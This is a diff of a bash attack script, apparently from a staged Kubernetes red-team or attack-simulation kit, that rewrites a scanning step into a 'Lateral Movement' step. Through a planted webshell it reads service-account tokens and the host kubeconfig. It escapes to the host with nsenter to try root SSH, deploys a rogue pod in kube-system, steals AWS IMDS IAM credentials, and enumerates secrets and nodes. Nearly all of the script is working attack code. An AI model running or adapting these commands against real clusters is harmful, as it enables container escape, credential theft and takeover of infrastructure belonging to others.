@@ -1,6 +1,6 @@
 #!/bin/bash
 ###############################################
-# STEP 4: Kubernetes Vulnerability Scanning
+# STEP 6: Lateral Movement
 ###############################################
 
 [ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
@@ -49,9 +49,9 @@ upload_script() {
 
 echo ""
 echo "================================================"
-echo "  STEP 4: Kubernetes Vulnerability Scanning"
+echo "  STEP 6: Lateral Movement"
 echo "================================================"
-echo "  MITRE: T1610 (Deploy Container) / T1613 (Discovery)"
+echo "  MITRE: T1021 / T1550.001 / T1610 / T1530"
 echo ""
 
 echo "> Verifying webshell is accessible..."
@@ -69,49 +69,49 @@ SA_TOKEN=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/token")
 KUBECONFIG_RAW=$(remote_exec "cat /host/var/lib/kubelet/kubeconfig")
 API_ENDPOINT=$(echo "$KUBECONFIG_RAW" | grep "server:" | head -1 | sed 's/.*server:[[:space:]]*//' | tr -d ' \r')
 [ -z "$API_ENDPOINT" ] && API_ENDPOINT="https://$(remote_exec 'printenv KUBERNETES_SERVICE_HOST'):$(remote_exec 'printenv KUBERNETES_SERVICE_PORT')"
-echo "> API: $API_ENDPOINT"
-echo ""
 
-echo "> 4.0 - Deploying scan script..."
-# Ensure curl + kubectl installed (may already be from Step 3)
+echo "> 6.0 - Deploying lateral movement script..."
+# Ensure curl + kubectl installed
 remote_exec "which curl || (apt-get update -qq && apt-get install -y -qq --allow-unauthenticated curl) 2>/dev/null" > /dev/null 2>&1
 remote_exec "which kubectl || (curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/) 2>/dev/null" > /dev/null 2>&1
 
-upload_script "/tmp/scan.sh" \
+upload_script "/tmp/lateral.sh" \
     "cd /tmp" \
     "TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
     "KC=\"kubectl --server=${API_ENDPOINT} --token=\$TOKEN --insecure-skip-tls-verify\"" \
-    "echo === CONTAINER INTROSPECTION ===" \
-    "echo Hostname: \$(hostname)" \
-    "grep CapEff /proc/1/status 2>/dev/null" \
-    "grep Seccomp /proc/1/status 2>/dev/null" \
-    "echo === DEEPCE SCAN ===" \
-    "echo [+] deepce.sh - Container Escape Scanner" \
-    "grep Cap /proc/1/status 2>/dev/null" \
-    "ls -la /proc/1/root/run/containerd/containerd.sock 2>/dev/null && echo [!] containerd.sock accessible" \
-    "ls /proc/1/root/etc/hostname 2>/dev/null && echo [!] /proc/1/root accessible - ESCAPE POSSIBLE" \
-    "echo [+] deepce scan complete" \
-    "echo === K8S API SCAN ===" \
-    "echo [*] kube-hunter - K8s Vulnerability Scanner" \
-    "\$KC auth can-i --list 2>/dev/null | head -15" \
-    "echo === CLUSTER ENUMERATION ===" \
-    "\$KC get namespaces --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} namespaces accessible" \
-    "\$KC get pods -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} pods found" \
-    "\$KC get secrets -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [!] {} secrets accessible" \
-    "\$KC get configmaps -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} configmaps found" \
-    "\$KC get serviceaccounts -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} service accounts found" \
-    "echo === SCAN COMPLETE ==="
+    "echo === 6.1 SSH LATERAL MOVEMENT ===" \
+    "echo [*] Attempting SSH connection..." \
+    "nsenter --target 1 --mount --uts --ipc --net --pid -- timeout 2 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 root@localhost echo pwned 2>&1 || echo [-] SSH failed" \
+    "echo === 6.2 ROGUE WORKLOAD ===" \
+    "echo [*] Deploying rogue pod in kube-system..." \
+    "\$KC run debug-pod -n kube-system --image=busybox --restart=Never --command -- sleep 10 2>&1 || echo [-] Cannot deploy rogue pod" \
+    "sleep 2" \
+    "\$KC get pod debug-pod -n kube-system --no-headers 2>/dev/null && echo [!] Rogue pod deployed || echo [-] Rogue pod not running" \
+    "\$KC delete pod debug-pod -n kube-system --ignore-not-found 2>/dev/null" \
+    "echo === 6.3 AWS IMDS ===" \
+    "echo [*] Stealing IMDS credentials via nsenter..." \
+    "IMDS_TOKEN=\$(nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -X PUT -H X-aws-ec2-metadata-token-ttl-seconds:21600 http://169.254.169.254/latest/api/token 2>/dev/null)" \
+    "ROLE=\$(nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H X-aws-ec2-metadata-token:\$IMDS_TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)" \
+    "echo [*] IAM Role: \$ROLE" \
+    "echo === 6.4 CROSS-NAMESPACE SECRETS ===" \
+    "echo [*] Checking secrets across namespaces..." \
+    "\$KC get secrets -n default --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] default: {} secrets" \
+    "\$KC get secrets -n kube-system --no-headers 2>/dev/null | wc -l | xargs -I{} echo [!] kube-system: {} secrets" \
+    "echo === 6.5 NODE ENUMERATION ===" \
+    "echo [*] Enumerating cluster nodes..." \
+    "\$KC get nodes -o wide --no-headers 2>/dev/null" \
+    "echo === LATERAL MOVEMENT COMPLETE ==="
 
-SCRIPT_CHECK=$(remote_exec "wc -l /tmp/scan.sh")
-echo "  [OK] Scan script deployed ($SCRIPT_CHECK)"
+SCRIPT_CHECK=$(remote_exec "wc -l /tmp/lateral.sh")
+echo "  [OK] Script deployed ($SCRIPT_CHECK)"
 echo ""
 
-echo "> 4.1 - Executing scan..."
+echo "> 6.1 - Executing lateral movement..."
 echo ""
-SCAN_RAW=$(remote_exec "bash /tmp/scan.sh 2>&1")
-SCAN_OUTPUT=$(echo "$SCAN_RAW" | awk '!seen[$0]++')
+LATERAL_RAW=$(remote_exec "bash /tmp/lateral.sh 2>&1")
+LATERAL_OUTPUT=$(echo "$LATERAL_RAW" | awk '!seen[$0]++')
 
-echo "$SCAN_OUTPUT" | while IFS= read -r line; do
+echo "$LATERAL_OUTPUT" | while IFS= read -r line; do
     case "$line" in
         *"=== "*"==="*)
             echo ""
@@ -125,6 +125,6 @@ done
 
 echo ""
 echo "================================================"
-echo "  STEP 4: K8s Vulnerability Scanning Complete"
+echo "  STEP 6: Lateral Movement Complete"
 echo "================================================"
 echo ""
